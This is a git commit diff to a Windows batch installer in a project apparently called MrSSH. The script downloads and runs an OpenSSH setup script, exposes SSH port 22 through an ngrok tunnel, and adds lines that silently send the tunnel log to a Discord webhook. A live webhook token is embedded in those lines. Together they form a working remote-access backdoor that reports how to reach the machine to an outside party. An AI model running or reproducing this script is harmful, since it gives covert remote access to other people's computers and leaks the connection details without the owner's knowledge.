15729f192b8a1a374b13856ed63760eed4d7cbee
dh3b <74708369+dh3b@users.noreply.github.com>
2021-10-16 23:18:15 +0200

    Update Installer.bat

--- Files/Installer.bat
+++ Files/Installer.bat
@@ -2,10 +2,12 @@ C:
 cd %temp%
 
 curl https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/OpenSSH.ps1 -o OpenSSH.ps1
-curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat -o discordmsg.bat
+curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat -o source.bat
 curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o ngrok.zip
 
 powershell ./OpenSSH.ps1
 
 tar -xf ngrok.zip
-ngrok.exe tcp 22
+ngrok tcp 22 -log=stdout > ngrok.log &
+set "webhook=https://discord.com/api/webhooks/893838978833350706/S6T93mD5c6dA6kMHIgWWzHPiFJH3rj2XqANwwvPn2nHmkJhEd6PPYJeNvO3qKCKG6xtK"
+Source.bat -silent --file %temp%/ngrok.log
